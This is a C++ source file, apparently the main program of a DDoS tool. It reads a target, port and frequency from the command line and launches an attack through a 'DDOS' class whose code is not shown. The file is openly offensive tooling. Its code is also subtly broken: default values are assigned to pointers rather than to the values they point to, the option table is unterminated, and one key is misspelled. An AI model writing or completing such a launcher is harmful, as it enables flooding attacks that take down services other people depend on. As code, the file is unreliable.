#include "../include/commands.hh"

int main(int argc, char **argv) {

  int c;
  struct option options[] = {
      {"port",         required_argument, 0, 'p'},
      {"frequency",    required_argument, 0, 'f'},
      {"target",       required_argument, 0, 'i'}
  };
  map<string, string> commands;

  while(true) {
    c = getopt_long(argc, argv, "p:t:f:i:", options, NULL);

    if (c == -1)
      break;

    switch (c) {
      case 'p':
        commands["port"] = optarg;
        break;

      case 'f':
        commands["freqency"] = optarg;
        break;

      case 'i':
        commands["target"] = optarg;
        break;

      case '?':
        HELP
        exit(0);
        break;
      }
    }

    MIN_SUPER_INT port = atoi(commands["port"].c_str());
    MAX_SUPER_INT frequency = atoi(commands["freqency"].c_str());

    subChecking(&port, &frequency);

    DDOS go(commands["target"], frequency, port);
    go.attack();
  return 0;
}

template<typename P, typename F>
static void subChecking(P *port, F *frequency) {
  if(*(port) == 0) {
    port = (P *) 80;
    CHANGE_PORT
  }

  if(*(frequency) == 0) {
    frequency = (F *) 10;
    CHANGE_FREQUENCY
  }
}
